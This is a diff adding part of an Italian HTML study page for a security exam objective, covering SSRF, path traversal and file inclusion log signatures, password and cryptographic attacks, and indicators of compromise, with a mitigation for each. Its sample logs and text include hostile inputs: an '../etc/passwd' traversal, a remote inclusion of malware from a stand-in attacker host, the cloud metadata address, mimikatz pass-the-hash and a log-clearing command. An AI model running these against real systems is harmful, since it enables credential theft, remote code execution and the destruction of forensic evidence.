+        <li><strong>Current Password Verification (Verifica della password corrente)</strong>: Per operazioni particolarmente sensibili (come la variazione delle informazioni di login, il cambio email, o prelievi di denaro), l'applicazione richiede all'utente di ridigitare la propria password corrente. Anche se l'hacker forzasse la sottomissione del form in background, non conoscendo la password corrente della vittima, la richiesta verrà sistematicamente rigettata dal server.</li>
+      </ul>
+    </dd>
+
+    <dt>2. SSRF — Server-Side Request Forgery (Falsificazione lato server)</dt>
+    <dd>A differenza di CSRF (dove l'attaccante induce il browser del client a fare chiamate), in un attacco <strong>SSRF</strong> l'attaccante induce il <strong>server web stesso</strong> a fare chiamate di rete arbitrarie a proprio nome. Sfruttando campi di input in cui l'applicazione accetta URL esterni (es. "inserisci URL della foto profilo per caricarla"), l'attaccante invia indirizzi privati interni all'infrastruttura (es: <code>http://localhost:8080/admin</code> o <code>http://169.254.169.254/latest/meta-data/</code> su cloud come AWS per leggere credenziali IAM di accesso). Il server bersaglio fa da ponte, permettendo all'hacker di bypassare firewall e reti interne isolate dall'esterno.<br><strong>• Mitigazioni principali:</strong> Implementazione di una <strong>Whitelist di domini</strong> consentiti per le richieste esterne del server; divieto assoluto di risolvere IP privati (RFC 1918) o locali (loopback); disabilitazione delle query verso l'endpoint per i metadata del cloud (<code>169.254.169.254</code>); e isolamento stretto delle macchine in DMZ.</dd>
+  </dl>
+
+  <h3 id="dir-trav">Directory Traversal e File Inclusion (Log Analysis)</h3>
+  <p>
+    Sia il <strong>Directory Traversal</strong> che la <strong>File Inclusion (LFI/RFI)</strong> lasciano firme estremamente esplicite all'interno dei file di log dei server web (come Apache o Nginx). Gli indicatori chiave includono:
+  </p>
+  <dl class="termlist" style="margin-left: 10px; margin-bottom: 25px;">
+    <dt>Indicatore Directory Traversal (Path Traversal)</dt>
+    <dd>Presenza di sequenze di retrocessione <code>../</code> o <code>..\</code> inserite in richieste GET/POST che puntano a directory riservate di sistema.
+      <br><strong>Esempio di Log:</strong> <code>192.168.1.10 - - [24/May/2026:10:14:00] "GET /view.php?file=../../../../etc/passwd HTTP/1.1" 200 1024</code> (l'attaccante ha letto con successo il file passwd come indicato dal codice di ritorno HTTP 200).
+      <br><strong>• Mitigazione principale:</strong> Uso di una whitelist rigida nei nomi dei file accettati, normalizzazione logica dei percorsi (canonicalization) prima del loro utilizzo, posizionamento delle risorse al di fuori del web root, e divieto assoluto di accettare input dell'utente per funzioni di I/O su filesystem.
+    </dd>
+    <dt>Indicatore Local File Inclusion (LFI)</dt>
+    <dd>Richiesta di file interni o risonanti insoliti (es: log di sistema, immagini contenenti codice incorporato, sessioni d'utente) passati come parametri ad interpreti di pagina.
+      <br><strong>Esempio di Log:</strong> <code>192.168.1.10 - - [24/May/2026:10:15:20] "GET /index.php?page=uploads/avatar.jpg HTTP/1.1" 200 512</code>.
+      <br><strong>• Mitigazione principale:</strong> Evitare per quanto possibile l'inclusione dinamica dei percorsi, preferendo invece un'associazione rigida a ID fissi (es. <code>1 = home, 2 = about</code>) ed eseguendo la validazione robusta dei tipi di file.
+    </dd>
+    <dt>Indicatore Remote File Inclusion (RFI)</dt>
+    <dd>Parametri URL completi di protocollo (<code>http://</code>, <code>https://</code>, <code>ftp://</code>) che puntano a domini esterni sconosciuti o IP pubblici arbitrari trasmessi a parametri interni di caricamento file o template.
+      <br><strong>Esempio di Log:</strong> <code>192.168.1.10 - - [24/May/2026:10:16:45] "GET /index.php?page=http://attacker-server.com/malware.txt HTTP/1.1" 200 4096</code>.
+      <br><strong>• Mitigazione principale:</strong> Disabilitazione della direttiva di caricamento URL dinamico remoto nel file di configurazione dell'interprete (es. impostando <code>allow_url_include = Off</code> in PHP), e limitazione rigorosa del traffico in uscita generato dai server web.
+    </dd>
+  </dl>
+</section>
+
+
+<!-- ══ ATTACCHI CRITTOGRAFICI ════════════════════════════════════ -->
+<section id="crypto-attacks-section">
+  <h2>Attacchi crittografici (Cryptographic Attacks)</h2>
+
+  <h3 id="crypto-attacks">Downgrade · Collision · Birthday</h3>
+  <dl class="termlist">
+    <dt>Downgrade attack (Attacco di degradazione)</dt>
+    <dd>Forza due sistemi a usare una versione più vecchia e vulnerabile di un protocollo crittografico, invece di quella sicura negoziata originariamente. Esempio classico: POODLE (forzava da TLS a SSLv3), BEAST (forzava TLS 1.0). Indicatore: negoziazione di protocolli obsoleti (SSL, TLS 1.0) nonostante la disponibilità di versioni moderne.<br><strong>• Mitigazione principale:</strong> Disabilitazione completa a livello server e client di librerie o protocolli deprecati (SSLv2, SSLv3, TLS 1.0, TLS 1.1) a favore del solo TLS 1.2 o TLS 1.3, unito all'uso di robusti cipher suites e di HSTS (HTTP Strict Transport Security) per vietare fallback in chiaro.</dd>
+    <dt>Collision attack (Attacco di collisione)</dt>
+    <dd>Trova due input diversi che producono lo stesso hash (collisione). Se l'algoritmo di hashing è debole (MD5, SHA-1), l'attaccante può creare un file malevolo con lo stesso hash di un file legittimo: il sistema di verifica dell'integrità non rileva la sostituzione. Indicatore: due file con hash identico ma contenuto diverso.<br><strong>• Mitigazione principale:</strong> Utilizzo rigoroso e vincolante di algoritmi di hashing moderni e sicuri (come SHA-256, SHA-384, SHA-3) bandendo l'uso operativo di algoritmi insicuri o rotti quali l'MD5 o lo SHA-1.</dd>
+    <dt>Birthday attack (Attacco del compleanno)</dt>
+    <dd>Sfrutta il paradosso del compleanno della teoria della probabilità: con N possibili valori di hash, bastano √N input casuali per avere probabilità del 50% di trovare una collisione. È il fondamento matematico degli attacchi di collisione. Indica la necessità di hash più lunghi per resistere a questi attacchi.<br><strong>• Mitigazione principale:</strong> Pretesa dell'adozione di chiavi di cifratura ed impronte (hash) caratterizzate da dimensioni in bit molto elevate (SHA-256 produce 256 bit di spazio di indirizzamento, alzando la soglia del birthday attack a 2^128 operazioni necessarie, che risulta computazionalmente inavvicinabile).</dd>
+  </dl>
+</section>
+
+
+<!-- ══ ATTACCHI ALLE PASSWORD ════════════════════════════════════ -->
+<section id="password-attacks">
+  <h2>Attacchi alle password (Password Attacks)</h2>
+
+  <h3 id="spraying">Password spraying</h3>
+  <p>
+    Il <strong>password spraying</strong> è un attacco che testa una <em>singola
+    password comune</em> (o poche password) su <em>molti account diversi</em>.
+    È l'opposto del brute-force classico (molte password su un account). L'obiettivo
+    è evitare i lockout degli account: la maggior parte dei sistemi blocca un account
+    dopo N tentativi falliti consecutivi sullo stesso account. Con lo spraying, ogni
+    account riceve un solo tentativo — mai abbastanza per scatenare il lockout.
+  </p>
+
+  <div class="example-box">
+    <strong>Esempio — Lettura dei log di password spraying</strong><br>
+    Log: login fallito per administrator, jsmith, guest, cpolk, fmartin — tutti con
+    la stessa password "Spring2023", negli stessi secondi. Pattern diagnostico del
+    password spraying: <em>password uguale, username diversi, timestamp ravvicinati</em>.
+    Non è brute-force (che userebbe password diverse sullo stesso account).
+    Non è pass-the-hash (che userebbe hash, non password in chiaro).
+  </div>
+
+  <dl class="termlist">
+    <dt>Brute-force (informatico)</dt>
+    <dd>Testa tutte le combinazioni possibili di password su un singolo account finché non trova quella corretta. Molto lento, scatena facilmente i lockout. Indicatore: molti tentativi falliti consecutivi sullo stesso account (: password authentication succeeded ma MFA failed ripetutamente = tentativo di brute-force sul MFA).</dd>
+    <dt>Credential Stuffing (Riempimento di credenziali)</dt>
+    <dd>Un attacco altamente automatizzato in cui gli hacker pasturano script automatici con imponenti database di combinazioni <strong>username/password compromesse da precedenti violazioni (leaked)</strong> su altri siti web. L'attacco tenta di autenticarsi su centinaia di noti servizi online alternativi (es: e-commerce, banche, social network) speculando sull'abitudine diffusa degli utenti di **riutilizzare le medesime credenziali di accesso** su canali diversi. Non è brute force, poiché le coppie testate non sono casuali né generate al volo, ma derivano da credenziali reali violate altrove.</dd>
+    <dt>Differenza operativa chiave</dt>
+    <dd>Spraying: 1 password × N account → evita lockout. Brute-force: N password × 1 account → causa lockout. Credential Stuffing: Coppie note (User/Password) × N account in modo mirato.</dd>
+    <dt>Mitigazione principale dei Password Attacks</dt>
+    <dd>Uso tassativo di <strong>Multi-Factor Authentication (MFA)</strong> per invalidare credenziali compromesse; impostazione di regole di lockout intelligenti basate sulla geolocalizzazione e sull'indirizzo IP; integrazione dei sistemi CAPTCHA sulle schermate di login; e monitoraggio attivo tramite feed OSINT per forzare il cambio password degli utenti le cui credenziali risultino trapelate sul Dark Web.</dd>
+  </dl>
+
+  <h3 id="pass-hash">Pass-the-hash</h3>
+  <p>
+    Il <strong>pass-the-hash</strong> è un attacco di credential replay che usa l'hash
+    NTLM di una password di Windows per autenticarsi, senza conoscere la password in
+    chiaro. NTLM autentica usando un challenge-response basato sull'hash, non sulla
+    password: se l'attaccante ha l'hash, può autenticarsi esattamente come se avesse
+    la password. Lo strumento principale è <code>mimikatz</code> con il modulo
+    <code>sekurlsa::pth</code>.
+  </p>
+  <p>
+    <strong>• Mitigazioni principali:</strong> Disattivazione o drastica limitazione del protocollo obsoleto NTLM sul dominio Active Directory a favore del protocollo sicuro <strong>Kerberos</strong>; abilitazione di funzionalità hardware e logiche avanzate come <strong>Windows Defender Credential Guard</strong> per isolare lo spazio di indirizzamento LSASS da accessi non autorizzati; inserimento degli account sensibili nel gruppo di sicurezza blindato <strong>"Protected Users"</strong>; e sanificazione periodica dei sistemi per svuotare le credenziali memorizzate in cache ed evitare che amministratori locali aprano sessioni RDP persistenti su host potenzialmente compromessi.
+  </p>
+</section>
+
+
+<!-- ══ INDICATORI ════════════════════════════════════════════════ -->
+<section id="indicators-section">
+  <h2>Indicatori di compromissione (Indicators of Compromise — IoC)</h2>
+  <p>
+    Gli <strong>Indicators of Compromise (IoC)</strong> sono segnali osservabili che
+    suggeriscono che un sistema è stato compromesso o è sotto attacco. Non sono prove
+    definitive, ma trigger per l'investigazione. Riconoscerli rapidamente riduce il
+    dwell time (tempo che l'attaccante trascorre inosservato nel sistema).
+  </p>
+
+  <dl class="termlist" id="indicators">
+    <dt>Account lockout (Blocco account)</dt>
+    <dd>Un account viene bloccato provvisoriamente o permanentemente dall'Identity Provider dopo troppi tentativi consecutivi di autenticazione falliti. Dal punto di vista dell'indagine, un'ondata coordinata di lockout su molteplici profili indica attacchi di <em>Password Spraying</em>, mentre tentativi incessanti su un singolo profilo indicano <em>Brute-Force</em> (es. rilevabile tramite l'Event ID 4740 in Windows).</dd>
+    <dt>Concurrent session usage (Sessioni concorrenti)</dt>
+    <dd>Il medesimo utente risulta autenticato e simultaneamente operativo da posizioni geografiche distinte o terminali differenti a parità d'orario. Rappresenta un indicatore cruciale di credenziali rubate o di <em>Session Hijacking</em> (Pass-the-Cookie), in cui l'attaccante riutilizza il token di sessione sottratto mentre l'impiegato originale è ancora attivo.</dd>
+    <dt>Impossible travel (Viaggio impossibile)</dt>
+    <dd>Anomalia geo-spaziale in cui un account effettua login successivi con esito positivo da località remote incompatibili con i tempi fisici di spostamento (es. Milano alle 11:00 e Pechino alle 11:15). Dimostra inequivocabilmente che una terza parte remota ha acquisito indebitamente il controllo delle credenziali o della VPN.</dd>
+    <dt>Resource consumption (Consumo di risorse anomalo)</dt>
+    <dd>Picchi e saturazioni ingiustificate di CPU, RAM, I/O su disco o ampiezza di banda di rete. Identificano l'insorgenza furtiva di: <em>Cryptojacking</em> (CPU alterata), cifratura di massa operata da <em>Ransomware</em> (I/O disco massivo), replicazione automatica di worm e scansioni interne (traffico locale congestionato) o esfiltrazioni.</dd>
+    <dt>Resource inaccessibility (Inaccessibilità delle risorse)</dt>
+    <dd>Servizi web, database server, condivisioni di file e cartelle di produzione che diventano improvvisamente irraggiungibili per gli utenti legittimi. Indica scenari di attacchi <em>DDoS</em> in corso, interruzioni derivanti da malware distruttivo o sabotaggio dei dati operato da un insider malintenzionato.</dd>
+    <dt>Out-of-cycle logging (Logging fuori ciclo)</dt>
+    <dd>Attività di login, modifiche a livello di directory active directory o backup straordinari eseguiti in giorni festivi, weekend o orari tipicamente non presidiati (es. alle 3:00 del mattino). Poiché gli attaccanti preferiscono agire quando i team di risposta non sono fisicamente attivi in azienda, questo pattern di logging costituisce un forte criterio di analisi comportamentale.</dd>
+    <dt>Missing logs (Log mancanti)</dt>
+    <dd>Interruzione drastica o assenza ingiustificata della sottomissione di eventi da un endpoint verso il SIEM centralizzato. È l'indicazione diretta che un attaccante, dotato di poteri amministrativi sul sistema violato, ha disattivato gli agenti di monitoraggio o ripulito localmente i log (es. tramite <code>wevtutil cl Security</code>) per inibire le indagini forensi.</dd>
+    <dt>Blocked content (Contenuti bloccati)</dt>
+    <dd>La registrazione nei log del proxy o del DNS Web Filter di svariati tentativi respinti di connessione verso IP categorizzati come malevoli o domini non autorizzati. Indica che un malware all'interno dell'host sta tentando attivamente di contattare server esterni di <em>Command and Control (C2)</em> o di scaricare moduli aggiuntivi.</dd>
+    <dt>Articles or documents on security breach (Articoli e bollettini su violazioni di sicurezza)</dt>
+    <dd>Pubblicazioni ufficiali, report forensi post-incident, o notizie di stampa specializzata (OSINT) che descrivono breach avvenuti presso terze aziende o infrastrutture similari. Consentono ai SOC di estrarre preventivamente IoC descritti (TTP di specifici gruppi di hacker) per testare l'immunità dei propri perimetri.</dd>
+    <dt>Published/documented (Pubblicato/documentato)</dt>
+    <dd>Indicatori, CVE, bollettini di sicurezza e firme ufficialmente documentati da agenzie governative (come la CISA) o vendor. L'integrazione di questi stream di intelligence alimentati da fonti terze nel SIEM aziendale permette l'intercettazione e la firma immediata ed automatica delle stesse intrusioni.</dd>
+  </dl>
+
+  <div class="example-box">
+    <strong>Esempio pratico — Data exfiltration via VPN</strong><br>
+    I log VPN mostrano che un utente si connette durante la notte (orari non lavorativi =
+    out-of-cycle logging) e trasferisce dati verso un IP sospetto (resource consumption
+    anomala + blocked content potenziale). La combinazione di orario anomalo + destinazione
+    sospetta + volume di traffico = indicatori di <strong>data exfiltration</strong>.
+    Il fatto che l'attività avvenga via VPN legittima suggerisce credenziali rubate.
+  </div>
+</section>
+
+
+<!-- ══ QUIZ ══════════════════════════════════════════════════════ -->
+<section id="quiz-section">
+  <h2>Test di verifica — OBJ 2.4</h2>
+  <div class="chapter-meta">
+    <p><strong>25 questions d'esame</strong> su indicatori di attività malevola, con feedback immediato e spiegazione in italiano.</p>
+    <button class="quiz-launch-btn" id="quiz-open-btn">Avvia quiz OBJ 2.4 →</button>
+  </div>
+</section>
+
+
+<!-- ── FLASHCARD ───────────────────────────────────────────── -->
+<section id="flashcard" class="card" style="border: 1px solid var(--light-slate); padding: 24px; border-radius: 8px; margin-top: 40px; background-color: var(--white);">
+  <h2>Flashcard rapide OBJ 2.4</h2>
+  <p>Ripassa velocemente i concetti fondamentali con flashcard dinamiche ed autocontrollo sui termini d'esame (Clicca su ciascuna card per girarla o svelare la spiegazione).</p>
+  <div class="flashcard-deck">
+    <div class="flashcard" onclick="this.classList.toggle('flipped')">
+      <div class="flashcard-inner">
+        <div class="flashcard-front">
+          <span>Ransomware Indicators</span>
+          <small>Clicca per girare</small>
+        </div>
+        <div class="flashcard-back">
+          <p>Presenza di file con estensioni anomale (.ryk, .locked, .crypto) + dicitura di riscatto (.txt/.html) + picchi elevatissimi di I/O disco causati dal processo di cifratura massivo dei file.</p>
+        </div>
+      </div>
+    </div>
+
+    <div class="flashcard" onclick="this.classList.toggle('flipped')">
+      <div class="flashcard-inner">
+        <div class="flashcard-front">
+          <span>Trojan vs Worm propagation</span>
+          <small>Clicca per girare</small>
+        </div>
+        <div class="flashcard-back">
+          <p><strong>Trojan</strong>: richiede interazione o installazione cosciente (nascosto dentro software lecito).<br><strong>Worm</strong>: si diffonde in modo 100% automatico e autonomo tra sistemi in rete senza interazione.</p>
+        </div>
+      </div>
+    </div>
+
+    <div class="flashcard" onclick="this.classList.toggle('flipped')">
+      <div class="flashcard-inner">
+        <div class="flashcard-front">
+          <span>Rootkit vs Logic Bomb indicatori</span>
+          <small>Clicca per girare</small>
+        </div>
+        <div class="flashcard-back">
+          <p><strong>Rootkit</strong>: alterazione hash di sistema (alert FIM) + mascheramento processi avanzati.<br><strong>Logic Bomb</strong>: codice letale silente attivato da date/orari o licenziamenti dipendenti.</p>
+        </div>
+      </div>
+    </div>
+
+    <div class="flashcard" onclick="this.classList.toggle('flipped')">
+      <div class="flashcard-inner">
+        <div class="flashcard-front">
+          <span>DNS Poisoning vs DNS Tunneling</span>
+          <small>Clicca per girare</small>
+        </div>
+        <div class="flashcard-back">
+          <p><strong>DNS Poisoning</strong>: manipolazione dei record DNS per fare hijack traffico.<br><strong>DNS Tunneling</strong>: esfiltrazione fraudolenta incapsulando dati crittografati in query/subdomain DNS.</p>
+        </div>
+      </div>
+    </div>
+
+    <div class="flashcard" onclick="this.classList.toggle('flipped')">
+      <div class="flashcard-inner">
+        <div class="flashcard-front">
+          <span>Password Spraying vs Brute Force</span>
+          <small>Clicca per girare</small>
+        </div>
+        <div class="flashcard-back">
+          <p><strong>Spraying</strong>: prova la stessa password comune su migliaia di username (evita lockout).<br><strong>Brute Force</strong>: prova migliaia di password sullo stesso singolo account utente.</p>
+        </div>
+      </div>
+    </div>
+
+    <div class="flashcard" onclick="this.classList.toggle('flipped')">
+      <div class="flashcard-inner">
+        <div class="flashcard-front">
+          <span>RFID Cloning indicatori fisici</span>
+          <small>Clicca per girare</small>
+        </div>
+        <div class="flashcard-back">
+          <p>Il medesimo badge ID registrato in varchi distanti nello stesso istante, oppure in varchi d'accesso consecutivi in un lasso di tempo fisicamente impossibile (impossibility travel locale).</p>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<div class="chapter-nav">
+  <a href="en_obj2_3_vulnerabilities.html">← OBJ 2.3 — Vulnerabilità</a>
+  <a href="en_obj2_5_mitigation.html" class="secondary">OBJ 2.5 — Mitigazioni →</a>
+</div>
+
+</main>
+</div>
+</div></div>
+
+
+<!-- ══ CENTRALIZED QUIZ & HYBRID LAYOUT MODULES ══════════════ -->
+<script src="../script/quiz-database.js" defer></script>
+<script src="../script/chapter-quiz-loader.js" defer></script>
+<script src="../script/global-nav-footer.js" defer></script>
+
+<script src="../script/global-search.js" defer></script>
+</body>
+</html>
